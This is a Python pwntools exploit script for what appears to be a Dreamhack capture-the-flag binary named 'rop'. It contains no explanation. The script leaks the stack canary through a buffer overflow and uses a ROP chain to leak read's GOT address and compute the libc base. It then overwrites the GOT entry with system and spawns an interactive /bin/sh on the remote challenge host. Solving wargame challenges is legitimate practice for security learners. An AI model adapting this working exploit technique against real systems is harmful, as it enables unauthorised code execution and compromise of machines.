from pwn import *
context.arch = "amd64"
p=remote("host1.dreamhack.games",19199)
#p=process("./rop")
e=ELF("./rop")
def slog(name, addr): return success(': '.join([name, hex(addr)]))

#get canary
payload=b'A'*0x39
p.sendafter(b"Buf: ",payload)
p.recvuntil(payload)
canary=u64(b"\x00"+p.recvn(7))
slog("canary",canary)

#write payload
libc=ELF("./libc.so.6")
readplt=e.plt['read']
readgot=e.got['read']
writeplt=e.plt['write']
poprdi=0x0000000000400853
poprsir15=0x0000000000400851
ret=0x0000000000400596

payload=b'A'*0x38+p64(canary)+b'A'*0x8
payload+=p64(poprdi)+p64(1)
payload+=p64(poprsir15)+p64(readgot)+p64(0)
payload+=p64(writeplt)

payload+=p64(poprdi)+p64(0)
payload+=p64(poprsir15)+p64(readgot)+p64(0)
payload+=p64(readplt)

payload+=p64(poprdi)
payload+=p64(readgot+0x8)
payload+=p64(ret)
payload+=p64(readplt)

p.sendafter(b"Buf: ",payload)
read=u64(p.recvn(6)+b'\x00'*2)
lb=read-libc.symbols['read']
system=lb+libc.symbols['system']

p.send(p64(system)+b'/bin/sh\x00')

p.interactive()